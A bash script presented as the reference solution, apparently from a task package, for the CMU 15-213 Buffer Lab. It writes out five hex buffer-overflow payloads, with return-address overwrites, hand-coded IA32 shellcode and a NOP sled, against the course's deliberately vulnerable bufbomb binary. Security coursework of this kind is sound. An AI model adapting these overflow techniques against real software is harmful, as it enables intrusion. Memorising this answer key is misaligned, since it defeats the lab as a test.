#!/bin/bash
# Reference solution for CMU 15-213 Buffer Lab
# Generates all 5 exploit payloads with pre-computed hex values.
#
# Binary: bufbomb (IA32), userid: agent007
# Cookie: 0x186bbde1
#
# Key addresses (from objdump -d / objdump -t bufbomb):
#   smoke()      = 0x08048c18    fizz()       = 0x08048c42
#   bang()       = 0x08048c9d    global_value = 0x0804d100
#   getbuf()     = 0x080491f4    getbufn()    = 0x0804920c
#   ret in test  = 0x08048dbe    ret in testn = 0x08048e3a
#
# Runtime (ASLR off, mmap'd stack at 0x55586000):
#   getbuf  ebp  = 0x556832f0   buf = ebp-0x28  = 0x556832c8
#   test()  ebp  = 0x55683320   (saved ebp in getbuf's frame)
#
# NOTE: kaboom (Level 4) requires the -n flag: ./bufbomb -u agent007 -n
set -euo pipefail

echo "=== Buffer Lab Reference Solution ==="
cd /workspace

# ── Level 0: smoke ─────────────────────────────────────
# 44 bytes NOP padding + return addr → smoke() @ 0x08048c18
cat > smoke.txt << 'EOF'
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 18 8c 04 08
EOF

# ── Level 1: fizz ──────────────────────────────────────
# 44 bytes NOP + ret → fizz() + fake_ret(0xdeadbeef) + cookie(0x186bbde1)
cat > fizz.txt << 'EOF'
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 42 8c 04 08
ef be ad de e1 bd 6b 18
EOF

# ── Level 2: bang ──────────────────────────────────────
# Shellcode: movl $0x186bbde1, 0x0804d100; push $0x08048c9d; ret
# + NOP padding + ret → buffer @ 0x556832c8
cat > bang.txt << 'EOF'
c7 05 00 d1 04 08 e1 bd 6b 18 68 9d 8c 04 08 c3
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 c8 32 68 55
EOF

# ── Level 3: boom ──────────────────────────────────────
# Shellcode: mov $cookie,%eax; mov $saved_ebp,%ebp; push $ret_test; ret
# + NOP padding + ret → buffer @ 0x556832c8
cat > boom.txt << 'EOF'
b8 e1 bd 6b 18 bd 20 33 68 55 68 be 8d 04 08 c3
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 c8 32 68 55
EOF

# ── Level 4: kaboom (nitro -n) ─────────────────────────
# getbufn buffer = 520 bytes (ebp-0x208). 5 iterations with varying stack.
# Shellcode (15 B): mov $cookie,%eax; lea 0x28(%esp),%ebp; push $ret_testn; ret
# 505-byte NOP sled + 15-byte shellcode + 4-byte fake_ebp + 4-byte target
# Target: 0x5568320c (middle of NOP sled overlap across all 5 iterations)
# Repeated 5 times separated by 0x0a (Gets terminator).
python3 -c "
sc='b8 e1 bd 6b 18 8d 6c 24 28 68 3a 8e 04 08 c3'
sled=' '.join(['90']*505)
tail='ef be ad de 0c 32 68 55'
one=sled+' '+sc+' '+tail
parts=[one]*5
print(' 0a '.join(parts))
" > kaboom.txt

echo "All payload files created:"
for f in smoke.txt fizz.txt bang.txt boom.txt kaboom.txt; do
    echo "  $(wc -c < "$f") bytes  $f"
done
echo "=== Done ==="
